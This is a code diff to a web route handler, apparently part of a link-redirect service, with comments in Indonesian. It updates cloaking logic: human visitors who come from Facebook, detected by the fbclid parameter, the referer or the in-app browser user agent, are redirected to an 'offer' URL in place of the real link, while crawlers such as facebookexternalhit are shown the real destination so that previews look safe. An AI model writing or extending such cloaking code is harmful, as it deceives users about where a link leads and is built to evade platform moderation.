@@ -35,20 +35,35 @@ export async function GET(
   const SITE_NAME = settings?.site_name || "Loading...";
 
   // --- LOGIKA DETEKSI (PERSIS KODE LU) ---
+  // --- LOGIKA DETEKSI UPDATE (SUPAYA BISA TANPA FBCLID) ---
   const urlObj = new URL(request.url);
   const searchParams = urlObj.searchParams;
-  const referer = request.headers.get('referer') || "";
+  const referer = (request.headers.get('referer') || "").toLowerCase();
   const userAgent = request.headers.get('user-agent') || "";
 
+  // 1. Cek Parameter URL (fbclid)
   const hasFbclid = searchParams.has('fbclid');
+
+  // 2. Cek Referer (Datang dari domain facebook)
+  // l.facebook.com, m.facebook.com, lm.facebook.com, dll.
   const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
+
+  // 3. Cek Browser Bawaan Aplikasi Facebook (In-App Browser)
+  // FBAN = Facebook for Android, FBAV = Facebook App Version, FB_IAB = Facebook In-App Browser
+  const isFbAppBrowser = /FBAN|FBAV|FB_IAB/i.test(userAgent);
+
+  // 4. Gabungkan semua sinyal Facebook
+  const isFacebookVisitor = hasFbclid || isFromFbReferer || isFbAppBrowser;
+
+  // 5. Cek Bot (Facebook Crawler/Scraper wajib dianggap bot agar preview aman)
   const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);
 
   // Default Tujuan = Link Asli
   let finalDestination = entry.url;
 
-  // Logika Belok ke Offer (PERSIS KODE LU)
-  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
+  // Logika Belok ke Offer
+  // JIKA: Offer Aktif DAN (Pengunjung dari FB) DAN (Bukan Robot)
+  if (IS_OFFER_ACTIVE && isFacebookVisitor && !isBot) {
     finalDestination = OFFER_URL;
   }
 
